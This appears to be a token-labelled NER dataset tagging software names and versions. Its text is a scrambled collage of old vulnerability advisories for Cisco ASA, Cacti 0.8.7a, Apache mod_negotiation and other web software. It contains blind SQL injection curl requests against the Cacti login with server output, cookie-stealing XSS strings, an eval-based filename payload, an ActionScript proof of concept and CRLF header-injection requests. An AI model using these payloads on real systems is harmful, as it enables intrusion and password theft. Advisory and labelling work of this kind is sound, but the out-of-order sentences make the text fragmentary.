of O
a O
network O
to O
allow O
remote O
access O
. O

critical O
information O
assets O
. O

SecureWorks O
Risk O
Scoring O
Likelihood O
( O
scale O
of O
1-5 O
, O
with O
5 O
being O
high O
) O
: O
5 O

A O
remote O
attacker O
could O
exploit O
this O
vulnerability O
using O
a O
specially-crafted O
URL O
to O
execute O
script O
in O
a O
victim O
s O
web O
browser O
within O
the O
security O
context O
of O
the O
Adaptive O
Security O
Appliance O
site O
. O

Permission O
is O
hereby O
granted O
to O
link O
to O
this O
advisory O
via O
the O
SecureWorks O
website O
at O
or O
use O
in O
accordance O
with O
the O
fair O
use O
doctrine O
of O
U.S. O
copyright O
laws O
. O

If O
the O
client O
appends O
the O
carriage O
return O
( O
% O
0d O
) O
and O
line O
feed O
( O
% O
0a O
) O
characters O
to O
the O
URL O
, O
the O
web O
server O
will O
parse O
these O
and O
allow O
the O
client O
to O
inject O
arbitrary O
HTTP O
response O
headers O
. O

The O
web O
server O
issues O
a O
301 O
Moved O
Permanently O
status O
code O
to O
the O
connecting O
client O
to O
facilitate O
this O
redirection O
. O

Vendors O
contacted O
: O
Cisco O
Systems O
, O
Inc. O
Release O
mode O
: O
Coordinated O
release O
Discovered O
by O
: O
Daniel O
King O
, O
SecureWorks O
Summary O
Cisco O
Adaptive O
Security O
Appliance O
( O
ASA O
) O
is O
vulnerable O
to O
HTTP O
response O
splitting O
caused O
by O
improper O
validation O
of O
user-supplied O
input O
. O

Initial O
advisory O
release O
PGP O
Keys O
This O
advisory O
has O
been O
signed O
with O
the O
PGP O
key O
of O
the O
SecureWorks O
Counter O
Threat O
Unit O
( O
SM O
) O
, O
which O
is O
available O
for O
download O
at O
About O
the O
SecureWorks O
Counter O
Threat O
Unit O
( O
SM O
) O
Our O
expert O
team O
of O
threat O
researchers O
, O
also O
known O
as O
the O
SecureWorks O
Counter O
Threat O
Unit O
( O
SM O
) O
, O
identifies O
and O
analyzes O
emerging O
threats O
and O
develops O
countermeasures O
, O
correlations O
and O
SOC O
processes O
to O
protect O
clients O

Upgrade O
to O
ASA O
software O
version O
8.1 O
( O
2 O
) O
to O
remediate O
this O
issue O
. O

The O
most O
recent O
version O
of O
this O
advisory O
may O
be O
found O
on O
the O
SecureWorks O
web O
site O
at O
for O
a O
limited O
period O
of O
time O
. O

Affected O
Products O
Cisco SN
ASA SN
version O
8.1 SV
( O
1 SV
) O
and SV
earlier SV
. O

This O
advisory O
may O
not O
be O
edited O
or O
modified O
in O
any O
way O
without O
the O
express O
written O
consent O
of O
SecureWorks O
, O
Inc O
. O

ANY O
USE O
OF O
THIS O
INFORMATION O
IS O
AT O
THE O
USER O
S O
RISK O
. O

The O
client O
web O
browser O
will O
act O
on O
only O
the O
last O
Location O
header O
it O
encounters O
and O
redirect O
there O
. O

Using O
this O
method O
, O
it O
is O
possible O
to O
inject O
a O
second O
Location O
header O
to O
the O
client O
. O

[ O
SWRX-2010-001 O
] O
Cisco O
ASA O
HTTP O
Response O
Splitting O
Vulnerability O

CRLF O
injection O
vulnerability O
in O
SocialEngine SN
( O
SE SN
) O
2.7 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
PHPSESSID O
cookie O
. O

CRLF O
injection O
vulnerability O
in O
Ruby SN
on SN
Rails SN
before SV
2.0.5 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
to O
the O
redirect_to O
function O
. O

CRLF O
injection O
vulnerability O
in O
the O
WebContainer O
in O
IBM SN
WebSphere SN
Application SN
Server SN
( O
WAS SN
) O
5.1.1.19 SV
and SV
earlier SV
5.1.x SV
versions O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
Cacti SN
0.8.7 SV
before SV
0.8.7b SV
and SV
0.8.6 SV
before SV
0.8.6k SV
, O
when O
running O
on O
older O
PHP O
interpreters O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

B O
) O
Path O
Disclosure O
Vulnerabilities O
The O
program O
checks O
the O
value O
of O
a O
non O
existent O
parameter O
. O

Follow O
an O
example O
of O
blind O
SQL O
injection O
( O
by O
an O
authenticated O
user O
) O
: O
ve O
& O
graph_list=bla O
% O
20or O
% O
20 O
1 O
= O
1 O
The O
following O
request O
needs O
admin O
permission O
to O
be O
executed O
, O
so O
it O
has O
limited O
impact O
: O
f_id=1 O
% O
20or O
% O
201 O
% O
20= O
% O
201 O
Same O
as O
above O
graph_xport.php O
is O
also O
vulnerable O
to O
an O
SQLi O
exploitable O
by O
authenticated O
users O
: O
curl O
-d O
local_graph_id=1 O
-H O
Cookie O
: O
Cacti= O
< O
cookie O
value O
> O
Also O
the O
program O
contains O
a O
serious O
logic O
flaw O
. O

Disclaimer O
: O
The O
information O
in O
the O
advisory O
is O
believed O
to O
be O
accurate O
at O
the O
time O
of O
publishing O
based O
on O
currently O
available O
information O
. O

Cacti SN
0.8.7a SV
Multiple O
Vulnerabilities O
Name O
Multiple O
Vulnerabilities O
in O
Cacti O
Systems O

The O
initial O
rows O
of O
the O
routine O
are O
: O
function O
set_tree_visibility_status O
( O
) O
{ O
if O
( O
! O
isset O
( O
$ O
_REQUEST O
[ O
subaction O
headers O
= O
db_fetch_assoc O
( O
SELECT O
graph_tree_id O
, O
order_key O
FROM O
graph_tree_items O
WHERE O
host_id= O
0 O
AND O
local_graph_id= O
0 O
AND O
graph_tree_id= O
. O

Vendor O
Advisory O
Author O
Francesco O
ascii O
Ongaro O
( O
ascii O
AT O
ush O
DOT O
it O
) O
Antonio O
s4tan O
Parata O
( O
s4tan O
AT O
ush O
DOT O
it O
) O
Date O
20071218 O
I O
. O

CVE O
INFORMATION O
No O
CVE O
at O
this O
time O
. O

BACKGROUND O
From O
the O
cacti O
web O
site O
: O
Cacti O
is O
a O
complete O
network O
graphing O
solution O
designed O
to O
harness O
the O
power O
of O
RRDTool O
data O
storage O
and O
graphing O
functionality O
. O

Summary O
: O
A O
) O
XSS O
Vulnerabilities O
graph.php O
( O
view_type O
parameter O
) O
graph_view.php O
( O
filter O
parameter O
) O
index.php/login O
( O
action O
parameter O
) O
index.php/login O
( O
login_username O
parmeter O
) O
B O
) O
Path O
Disclosure O
Vulnerabilities O
graph.php O
( O
local_graph_id O
parameter O
) O
C O
) O
SQL O
Injection O
Vulnerabilities O
graph_view.php O
( O
graph_list O
parameter O
) O
tree.php O
( O
leaf_id O
parameter O
) O
graph_xport.php O
( O
local_graph_id O
parameter O
) O
tree.php O
( O
id O
parameter O
) O
index.php/login O
( O
login_username O
parameter O
) O
D O
) O
HTTP O
response O
splitting O
on O
very O
old O
PHP O
instances O
A O
) O
XSS O
Vulnerabilities O

$ O
_REQUEST O
[ O
id O
] O
. O

An O
SQL O
injection O
vulnerability O
exists O
in O
the O
authentication O
method O
( O
the O
attacker O
doesn O
t O
need O
to O
be O
authenticated O
in O
order O
to O
exploit O
it O
) O
. O

Francesco O
ascii O
Ongaro O
web O
site O
: O
mail O
: O
ascii O
AT O
ush O
DOT O
it O
Antonio O
s4tan O
Parata O
web O
site O
: O
mail O
: O
s4tan O
AT O
ictsc O
DOT O
it O
, O
s4tan O
AT O
ush O
DOT O
it O
X O
. O

Suppose O
we O
know O
that O
exists O
the O
user O
name O
cacti O
, O
to O
know O
if O
it O
is O
an O
administrator O
we O
send O
the O
following O
request O
: O
curl O
-v O
-d O
login_username=cacti O
& O
action=login O
If O
a O
302 O
response O
code O
with O
Location O
index.php O
is O
returned O
then O
it O
is O
the O
administrator O
, O
in O
the O
other O
case O
with O
a O
Location O
of O
graph_view.php O
we O
have O
discovered O
a O
normal O
user O
. O

VENDOR O
RESPONSE O

Affected O
Cacti SN
0.8.7a SV
and SV
possibly SV
earlier SV
versions O
Severity O
High O
Impact O
( O
CVSSv2 O
) O
High O
( O
9/10 O
, O
vector O
: O
AV O
: O
N/AC O
: O
L/Au O
: O
N/C O
: O
C/I O
: O
P/A O
: O
P O
) O

DETECTION O
Cacti SN
0.8.7a SV
and SV
possibly SV
earlier SV
versions O
are O
vulnerable O
. O

One O
example O
of O
this O
vulnerability O
is O
shown O
by O
the O
following O
url O
: O
curl O
-d O
id=sql O
-H O
Cookie O
: O
Cacti= O
< O
cookie O
value O
> O
One O
of O
these O
vulnerable O
code O
is O
in O
the O
set_tree_visibility_status O
( O
) O
function O
in O
file O
lib/html_tree.php O
. O

DISCLOSURE O
TIMELINE O
20071113 O
Bug O
discovered O
20071218 O

Magic O
quotes O
ON O
will O
protect O
you O
against O
the O
most O
serious O
unauthenticated O
SQLi O
vulnerabilities O
and O
possibly O
other O
. O

This O
causes O
an O
SQL O
Injection O
attack O
possible O
. O

This O
produces O
an O
error O
that O
discloses O
the O
absolute O
installation O
path O
: O
Other O
vulnerable O
code O
exists O
since O
in O
Cacti O
PHP O
errors O
are O
displayed O
as O
they O
are O
, O
with O
no O
custom O
error O
handler O
. O

After O
this O
validation O
routine O
, O
the O
value O
of O
the O
input O
is O
used O
to O
create O
an O
SQL O
query O
, O
obtaining O
the O
value O
from O
the O
$ O
_REQUEST O
variable O
. O

The O
check O
is O
done O
with O
basename O
( O
$ O
_SERVER O
[ O
PHP_SELF O
] O
) O
. O

The O
program O
presents O
many O
input O
check O
routines O
, O
however O
some O
of O
these O
routines O
validate O
only O
the O
$ O
_GET O
variable O
. O

DESCRIPTION O
Multiple O
vulnerabilities O
exist O
in O
Cacti O
software O
( O
XSS O
, O
SQL O
Injection O
, O
Path O
Disclosure O
, O
HTTP O
Response O
Splitting O
) O
. O

C O
) O
SQL O
Injection O
Vulnerabilities O
There O
are O
some O
points O
in O
the O
program O
that O
don O
t O
check O
the O
input O
parameters O
. O

It O
may O
not O
be O
edited O
in O
any O
way O
without O
mine O
express O
written O
consent O
. O

But O
take O
a O
look O
at O
the O
if O
statement O
: O
if O
( O
( O
! O
in_array O
( O
basename O
( O
$ O
_SERVER O
[ O
PHP_SELF O
] O
) O
, O
$ O
no_http_header_files O
, O
true O
SERVER O
[ O
PHP_SELF O
The O
branch O
is O
not O
taken O
if O
we O
are O
calling O
a O
function O
that O
is O
present O
in O
$ O
no_http_header_files O
variable O
defined O
at O
line O
53 O
. O

We O
can O
also O
discovery O
the O
user O
name O
at O
the O
same O
way O
. O

Last O
but O
not O
least O
we O
show O
the O
most O
critical O
vulnerability O
. O

Vendor O
issued O
new O
version O
0.8.7b O
and O
0.8.6k O
to O
address O
the O
vulnerabilities O
available O
for O
download O
at O
following O
urls O
: O
Patches O
are O
also O
available O
: O
VII O
. O

Vendor O
contacted O
20080212 O
Advisory O
released O
IX O
. O

We O
have O
found O
many O
XSS O
vulnerabilities O
in O
the O
application O
. O

There O
are O
no O
warranties O
with O
regard O
to O
this O
information O
. O

The O
initial O
rows O
of O
the O
tree_edit O
( O
) O
routine O
are O
: O
function O
tree_edit O
( O
) O
{ O
global O
$ O
colors O
, O
$ O
fields_tree_edit O
; O
input O
validation O
input_validate_input_number O
( O
get_request_var O
( O
id O
The O
input_validate_input_number O
routine O
correctly O
validate O
the O
parameter O
, O
but O
the O
problem O
is O
that O
get_request_var O
routine O
returns O
the O
$ O
_GET O
value O
, O
as O
the O
following O
code O
show O
: O
function O
get_request_var O
( O
$ O
name O
, O
$ O
default O
if O
( O
isset O
( O
$ O
_GET O
[ O
$ O
name O
] O
) O
) O
{ O
return O
$ O
_GET O
[ O
$ O
name O
] O
; O
} O
else O
{ O
return O
$ O
default O
; O
} O
} O
So O
we O
can O
send O
our O
injection O
string O
in O
POST O
data O
( O
to O
skip O
the O
check O
) O
, O
and O
our O
value O
will O
be O
used O
because O
it O
has O
precedence O
over O
GET O
in O
the O
$ O
_REQUEST O
variable O
. O

) O
; O
The O
set_tree_visibility_status O
( O
) O
is O
called O
in O
grow_edit_graph_tree O
( O
$ O
tree_id O
, O
$ O
user_id O
, O
$ O
options O
) O
function O
. O

According O
to O
the O
PHP O
specifications O
, O
the O
$ O
_REQUEST O
variable O
looks O
for O
the O
value O
of O
the O
parameters O
in O
the O
following O
order O
: O
cookie O
, O
post O
data O
, O
get O
data O
. O

The O
following O
request O
is O
an O
example O
of O
blind O
SQL O
injection O
attack O
by O
inference O
: O
curl O
-v O
-d O
login_username=foo O
+or+ascii O
( O
substring O
( O
password,1,1 O
) O
) O
> O
56 O
& O
action=login O
If O
this O
query O
succeeds O
then O
a O
302 O
response O
code O
is O
sent O
in O
the O
response O
. O

The O
grow_edit_graph_tree O
( O
$ O
tree_id O
, O
$ O
user_id O
, O
$ O
options O
) O
is O
called O
in O
tree.php O
file O
by O
the O
tree_edit O
( O
) O
routine O
which O
is O
called O
from O
the O
main O
code O
. O

V. O
WORKAROUND O
Proper O
input O
validation O
will O
fix O
the O
vulnerabilities O
. O

Neither O
the O
author O
nor O
the O
publisher O
accepts O
any O
liability O
for O
any O
direct O
, O
indirect O
, O
or O
consequential O
loss O
or O
damage O
arising O
from O
use O
of O
, O
or O
reliance O
on O
, O
this O
information O
. O

CREDIT O
Francesco O
ascii O
Ongaro O
and O
Antonio O
s4tan O
Parata O
are O
credited O
with O
the O
discovery O
of O
this O
vulnerability O
. O

If O
we O
specify O
the O
injection O
string O
in O
the O
cookie O
data O
or O
in O
the O
post O
data O
, O
then O
we O
can O
bypass O
the O
validation O
routine O
. O

Use O
of O
the O
information O
constitutes O
acceptance O
for O
use O
in O
an O
AS O
IS O
condition O
. O

Again O
: O
this O
vulnerability O
is O
exploitable O
ONLY O
with O
magic O
quotes O
OFF O
and O
any O
value O
of O
register O
globals O
. O

Cacti O
provides O
a O
fast O
poller O
, O
advanced O
graph O
templating O
, O
multiple O
data O
acquisition O
methods O
, O
and O
user O
management O
features O
out O
of O
the O
box O
. O

We O
list O
some O
examples O
only O
, O
but O
many O
other O
injection O
points O
exist O
: O
=properties O
& O
view_type=token O
% O
3E O
% O
3Cscript O
% O
3Ealert O
( O
document.cookie O
) O
% O
3C/scr O
ipt O
% O
3E O
The O
following O
example O
will O
execute O
the O
code O
when O
the O
user O
clicks O
on O
the O
menu O
list O
: O
& O
graph_template_id=8 O
& O
filter=onmouseover=javascript O
: O
alert O
( O
/XSS/ O
) O
Also O
XSS O
vulnerabilities O
exist O
in O
the O
login O
page O
, O
where O
we O
authentication O
isn O
t O
needed O
: O
) O
% O
3C/script O
% O
3E O
In O
addition O
if O
we O
enter O
as O
user O
name O
: O
> O
< O
script O
> O
alert O
( O
/XSS/ O
) O
; O
< O
/script O
> O
, O
then O
we O
have O
another O
XSS O
. O

Well O
, O
if O
we O
set O
a O
URL O
like O
( O
sql.php O
is O
an O
entry O
in O
the O
$ O
no_http_header_files O
variable O
) O
then O
the O
basename O
( O
$ O
_SERVER O
[ O
PHP_SELF O
] O
) O
will O
return O
sql.php O
and O
we O
happly O
bypass O
the O
magic O
quote O
check O
: O
) O
However O
a O
complete O
authentication O
bypass O
can O
not O
be O
possible O
because O
the O
code O
that O
starts O
the O
session O
is O
in O
the O
chunk O
of O
code O
that O
we O
skip O
, O
so O
no O
$ O
_SESSION O
variable O
will O
be O
created O
and O
we O
are O
unable O
to O
bypass O
the O
following O
check O
at O
file O
auth.php O
: O
if O
( O
empty O
( O
$ O
_SESSION O
[ O
sess_user_id O
include O
( O
./auth_login.php O
) O
; O
exit O
; O
However O
it O
is O
possible O
to O
extract O
the O
password O
and O
user O
name O
from O
the O
DB O
by O
an O
SQL O
injection O
inference O
attack O
. O

There O
is O
also O
a O
nice O
trick O
that O
allows O
us O
to O
know O
if O
we O
have O
discovered O
the O
administrator O
user O
. O

However O
this O
attack O
is O
mitigated O
by O
the O
PHP O
framework O
that O
doesn O
t O
permits O
CR O
or O
LF O
injection O
anymore O
in O
the O
header O
function O
. O

If O
you O
wish O
to O
reprint O
the O
whole O
or O
any O
part O
of O
this O
alert O
in O
any O
other O
medium O
other O
than O
electronically O
, O
please O
email O
me O
for O
permission O
. O

$ O
curl O
-v O
-d O
login_username=foo O
+or+ascii O
( O
substring O
( O
password,1,1 O
) O
) O
< O
56 O
& O
action=login O
About O
to O
connect O
( O
) O
to O
port O
80 O
( O
0 O
) O
Trying O
127.0.0.1 O
... O
connected O
Connected O
to O
( O
127.0.0.1 O
) O
port O
80 O
( O
0 O
) O
POST O
/cacti-0.8.7a/index.php/sql.php O
HTTP/1.1 O
User-Agent O
: O
curl/1.1.1 O
( O
i986-gnu-ms-bsd O
) O
cacalib/3.6.9 O
OpenTelnet/0.1 O
Host O
: O
Accept O
: O
Content-Length O
: O
71 O
Content-Type O
: O
application/x-www-form-urlencoded O
< O
HTTP/1.1 O
200 O
OK O
< O
Date O
: O
Mon O
, O
17 O
Dec O
2007 O
19:29:34 O
GMT O
< O
Server O
: O
Apache O
< O
X-Powered-By O
: O
PHP/1.2.3-linuxz O
< O
Content-Length O
: O
355 O
< O
Content-Type O
: O
text/html O
< O
AAAAAAAAA O
: O
SELECT O
FROM O
user_auth O
WHERE O
username O
= O
foo O
or O
ascii O
( O
substring O
( O
password,1,1 O
) O
) O
< O
56 O
AND O
password O
= O
md5 O
AND O
realm=0 O
< O
br O
< O
b O
> O
Warning O
< O
/b O
> O
: O
Can O
not O
modify O
header O
information O
- O
headers O
already O
sent O
by O
( O
output O
started O
at O
/home/x/cacti-0.8.7a/auth_login.php:126 O
) O
in O
< O
b O
> O
/home/x/cacti-0.8.7a/auth_login.php O
< O
/b O
on O
line O
< O
b O
> O
200 O
< O
/b O
> O
< O
br O
Connection O
0 O
to O
host O
left O
intact O
Closing O
connection O
0 O
This O
vulnerability O
can O
be O
obviously O
exploited O
as O
follows O
$ O
curl O
-kis O
-d O
login_username=foo O
+or+ascii O
( O
substring O
( O
password,1,1 O
) O
) O
> O
56 O
& O
action=login O
| O
head O
-n1 O

In O
file O
global.php O
at O
line O
109 O
we O
have O
an O
if O
statement O
that O
if O
true O
detects O
if O
magic O
quote O
is O
off O
, O
if O
it O
off O
then O
it O
simulates O
it O
by O
calling O
addslashes O
( O
) O
function O
. O

LEGAL O
NOTICES O
Copyright O
( O
c O
) O
2007 O
Francesco O
ascii O
Ongaro O
Permission O
is O
granted O
for O
the O
redistribution O
of O
this O
alert O
electronically O
. O

Cacti SN
0.8.7a SV
Multiple O
Vulnerabilities O

Affected O
packages O
: O
cacti SN
< SV
0.8.7b SV
Multiple O
security O
vulnerabilities O
have O
been O
discovered O
in O
Cacti O
web O
interface O
: O
XSS O
vulnerabilities O
Path O
disclosure O
vulnerabilities O
SQL O
injection O
vulnerabilities O
HTTP O
response O
splitting O
vulnerabilities O
References O
: O
Mario O
Sergio O
Candian O
- O
Live O
your O
dreams O
and O
face O
your O
fears O

cacti O
Multiple O
security O
vulnerabilities O
have O
been O
discovered O

CRLF O
injection O
vulnerability O
in O
the O
mod_negotiation O
in O
the O
Apache SN
HTTP SN
Server SN
2.2.6 SV
and SV
earlier SV
in O
the O
2.2.x SV
series O
, O
2.0.61 SV
and SV
earlier SV
in O
the O
2.0.x SV
series O
, O
and O
1.3.39 SV
and SV
earlier SV
in O
the O
1.3.x SV
series O
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
by O
uploading O
a O
file O
with O
a O
multi-line O
name O
containing O
HTTP O
header O
sequences O
and O
a O
file O
extension O
, O
which O
leads O
to O
injection O
within O
a O
( O
1 O
) O
406 O
Not O
Acceptable O
or O
( O
2 O
) O
300 O
Multiple O
Choices O
HTTP O
response O
when O
the O
extension O
is O
omitted O
in O
a O
request O
for O
the O
file O
. O

blah O
: O
.jpg O
1 O
{ O
type O
image/jpeg O
} O
{ O
length O
2 O
} O
} O
Vary O
: O
negotiate O
TCN O
: O
list O
Content-Length O
: O
508 O
Content-Type O
: O
text/html O
; O
charset=iso-8859-1 O
< O
! O
DOCTYPE O
HTML O
PUBLIC O
- O
IETF O
DTD O
HTML O
2.0 O
EN O
< O
html O
> O
< O
head O
< O
title O
> O
406 O
Not O
Acceptable O
< O
/title O
< O
/head O
> O
< O
body O
< O
h1 O
> O
Not O
Acceptable O
< O
/h1 O
< O
p O
> O
An O
appropriate O
representation O
of O
the O
requested O
resource O
/junk O
Header O
: O
Injected O
blah O
: O
could O
not O
be O
found O
on O
this O
server. O
< O
/p O
Available O
variants O
: O
< O
ul O
< O
li O
> O
< O
a O
href= O
junk O
Header O
: O
Injected O
blah O
: O
.jpg O
> O
junk O
Header O
: O
Injected O
blah O
: O
.jpg O
< O
/a O
, O
type O
image/jpeg O
< O
/li O
< O
/ul O
< O
hr O
< O
address O
> O
Apache/2.0.55 O
( O
Ubuntu O
) O
PHP/5.1.6 O
Server O
at O
127.0.0.1 O
Port O
80 O
< O
/address O
< O
/body O
> O
< O
/html O
As O
it O
could O
be O
noted O
, O
the O
header O
response O
is O
splitted O
and O
Header O
: O
Injected O
is O
, O
indeed O
injected O
. O

Permission O
is O
hereby O
granted O
for O
the O
redistribution O
of O
this O
Alert O
electronically O
. O

In O
no O
event O
shall O
the O
author O
be O
liable O
for O
any O
damages O
whatsoever O
arising O
out O
of O
or O
in O
connection O
with O
the O
use O
or O
spread O
of O
this O
information O
. O

Http O
Response O
Splitting O
By O
using O
a O
similar O
technique O
, O
Http O
Response O
Splitting O
could O
be O
triggered O
if O
there O
some O
way O
to O
set O
the O
name O
of O
the O
file O
like O
the O
following O
: O
junk O
Header O
: O
Injected O
blah O
: O
.jpg O
Then O
, O
by O
requesting O
the O
urlencoded O
file O
name O
: O
GET O
/junk O
% O
0aHeader O
: O
% O
20Injected O
% O
0ablah O
: O
HTTP/1.1 O
Host O
: O
127.0.0.1 O
Accept O
: O
image/jpeg O
; O
q=0 O
HTTP/1.1 O
406 O
Not O
Acceptable O
Date O
: O
Tue O
, O
15 O
Jan O
2008 O
16:06:52 O
GMT O
Server O
: O
Apache/2.0.55 O
( O
Ubuntu O
) O
PHP/5.1.6 O
Alternates O
: O
{ O
junk O
Header O
: O
Injected O
< O
Here O
! O

[ O
Proof O
of O
Concept O
] O
The O
following O
actionscript O
can O
be O
used O
in O
order O
to O
trigger O
the O
Xss O
. O

Any O
use O
of O
this O
information O
is O
at O
the O
user O
own O
risk O
. O

Moreover O
, O
as O
the O
list O
of O
the O
filenames O
is O
also O
sent O
, O
without O
being O
sanitized O
, O
in O
the O
response O
header O
, O
it O
could O
result O
in O
a O
Http O
Response O
Splitting O
issue O
if O
the O
name O
of O
the O
file O
contains O
( O
Line O
Feed O
) O
. O

Tested O
Versions O
: O
Apache SN
< SV
=1.3.39 SV
< SV
= SV
2.0.61 SV
< SV
= SV
2.2.6 SV
Minded O
Security O
ReferenceID O
: O
MSA01150108 O
Credits O
: O
Discovery O
by O
Stefano O
Di O
Paola O
of O
Minded O
Security O
stefano.dipaola O
[ O
_at_ O
] O
mindedsecurity.com O
Severity O
: O
Low/Medium O
Permalink O
: O
[ O
Background O
] O
> O
From O
Apache O
Mod_Negotiation O
page O
: O
Content O
negotiation O
, O
or O
more O
accurately O
content O
selection O
, O
is O
the O
selection O
of O
the O
document O
that O
best O
matches O
the O
clients O
capabilities O
, O
from O
one O
of O
several O
available O
documents O
. O

Research O
Labs O
Minded O
Security O
S.r.l O
. O

public O
class O
TestXss O
extends O
flash.display.Sprite O
{ O
public O
function O
TestXss O
( O
) O
{ O
var O
r O
: O
URLRequest O
= O
new O
URLRequest O
( O
20onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
alert O
( O
123 O
) O
) O
; O
r.method O
= O
POST O
; O
r.data O
= O
unescape O
( O
test O
) O
; O
r.requestHeaders.push O
( O
new O
URLRequestHeader O
( O
Accept O
, O
image/jpeg O
; O
q=0 O
) O
) O
; O
navigateToURL O
( O
r O
, O
_self O
Credits O
] O
Stefano O
di O
Paola O
is O
credited O
with O
the O
discovery O
of O
this O
vulnerability O
. O

[ O
Summary O
] O
Mod_negotiation O
doesn O
t O
sanitize O
filenames O
in O
406 O
Not O
Acceptable O
response O
and O
300 O
Multiple O
Choices O
message O
body O
. O

There O
are O
NO O
warranties O
with O
regard O
to O
this O
information O
. O

Cross O
Site O
Scripting O
Let O
suppose O
mod_negotiation O
is O
enabled O
and O
an O
attacker O
could O
upload O
a O
file O
with O
arbitrary O
name O
and O
whatever O
mime O
extension O
. O

[ O
Disclosure O
Timeline O
] O
15/01/2008 O
Initial O
vendor O
notification O
16/01/2008 O

This O
could O
lead O
to O
Xss O
if O
the O
name O
of O
the O
file O
is O
controlled O
by O
an O
attacker O
( O
i.e O
. O

There O
are O
two O
implementations O
of O
this O
. O

Apache O
mod_negotiation O
Xss O
and O
Http O
Response O
Splitting O
Date O
: O
January O
22th O
, O
2008 O

Web O
: O
Mail O
: O
research_at_mindedsecurity.com O

[ O
Analysis O
] O
I O
. O

For O
example O
a O
legit O
jpeg O
file O
named O
: O
< O
img O
src=sa O
onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
> O
.jpg O
Then O
by O
requesting O
it O
without O
extension O
with O
Accept O
header O
set O
to O
image/jpeg O
; O
q=0 O
, O
GET O
< O
img O
% O
20src=sa O
% O
20onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
HTTP/1.1 O
Host O
: O
127.0.0.1 O
Accept O
: O
image/jpeg O
; O
q=0 O
HTTP/1.1 O
406 O
Not O
Acceptable O
Date O
: O
Tue O
, O
15 O
Jan O
2008 O
15:43:11 O
GMT O
Server O
: O
Apache/2.0.55 O
( O
Ubuntu O
) O
PHP/5.1.6 O
Alternates O
: O
{ O
< O
img O
src=sa O
onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
> O
.jpg O
1 O
{ O
type O
image/jpeg O
} O
{ O
length O
2 O
} O
} O
Vary O
: O
negotiate O
TCN O
: O
list O
Content-Length O
: O
610 O
Content-Type O
: O
text/html O
; O
charset=iso-8859-1 O
< O
! O
DOCTYPE O
HTML O
PUBLIC O
- O
IETF O
DTD O
HTML O
2.0 O
EN O
< O
html O
> O
< O
head O
< O
title O
> O
406 O
Not O
Acceptable O
< O
/title O
< O
/head O
> O
< O
body O
< O
h1 O
> O
Not O
Acceptable O
< O
/h1 O
< O
p O
> O
An O
appropriate O
representation O
of O
the O
requested O
resource O
/ O
< O
img O
src=sa O
onerror=eval O
( O
document.location.hash.substr O
( O
1 O
) O
) O
could O
not O
be O
found O
on O
this O
server. O
< O
/p O
Available O
variants O
: O
< O
ul O
< O
li O
> O
< O
a O
href= O
< O
img O
src=sa O
onerror=eval O
( O

Tested O
on O
IE SN
7 SV
and O
FF SN
2.0.11 SV
, O
Flash SN
9.0 SV
r115 SV
Compile O
with O
flex O
compiler O
package O
{ O
import O
flash.display.Sprite O
; O
import O
flash.net O
. O

If O
you O
wish O
to O
reprint O
the O
whole O
or O
any O
part O
of O
this O
Alert O
in O
any O
other O
medium O
excluding O
electronic O
medium O
, O
please O
e-mail O
research O
( O
at O
) O
mindedsecurity O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
for O
permission O
. O

by O
previously O
uploading O
it O
) O
. O

A O
type O
map O
( O
a O
file O
with O
the O
handler O
type-map O
) O
which O
explicitly O
lists O
the O
files O
containing O
the O
variants O
. O

A O
MultiViews O
search O
( O
enabled O
by O
the O
MultiViews O
Option O
, O
where O
the O
server O
does O
an O
implicit O
filename O
pattern O
match O
, O
and O
choose O
from O
amongst O
the O
results O
. O

It O
is O
not O
to O
be O
edited O
in O
any O
way O
without O
express O
consent O
of O
Minded O
Security O
Research O
Lab O
. O

Copyright O
( O
c O
) O
2008 O
Minded O
Security O
, O
S.r.l.. O
All O
rights O
reserved O
worldwide O
. O

Confirmed O
21/01/2008 O
Coordinated O
public O
disclosure O
22/01/2008 O
Minded O
Security O
Research O
Lab O
Advisory O
[ O
Reference O
] O
Divide O
and O
Conquer O
, O
HTTP O
Response O
Splitting O
, O
Web O
Cache O
Poisoning O
Attacks O
, O
and O
Related O
Topics O
, O
Amit O
Klein O
, O
March O
2004. O
f O
[ O
Disclaimer O
] O
The O
information O
within O
this O
paper O
may O
change O
without O
notice O
. O

Apache O
mod_negotiation O
Xss O
and O
Http O
Response O
Splitting O

CRLF O
injection O
vulnerability O
in O
index.php O
in O
ExpressionEngine SN
1.2.1 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
URL O
parameter O
. O

|+ O
oQQo O
ZARAZA O
U O
3APA3A O
} O
You O
know O
my O
name O
- O
look O
up O
my O
number O
( O
The O
Beatles O
) O
+ O
o66o O
+ O
|/ O

Crossite O
scripting O
and O
Denial O
of O
Service O
in O
PRO-Search SN
< SV
= SV
0.17 SV
XSS O
: O
ipt O
% O
3E O
t O
% O
3E O
Denial O
of O
Service O
: O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
4 O
. O

RotaBanner SN
Local SN
< SV
= SV
3 SV
crossite O
scripting O
C/script O
% O
3E O
) O
% O
3C/script O
% O
3E O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
6 O
. O

< O
= O
2.5d O
Original O
article O

Exploits O
: O
Original O
article O
( O
in O
Russian O
) O
: O
Additional O
details O
( O
in O
Ukrainian O
) O
: O
5 O
. O

Comment SN
Spam SN
Protection SN
< SV
2.2 SV
Original O
article O
: O
XSS O
in O
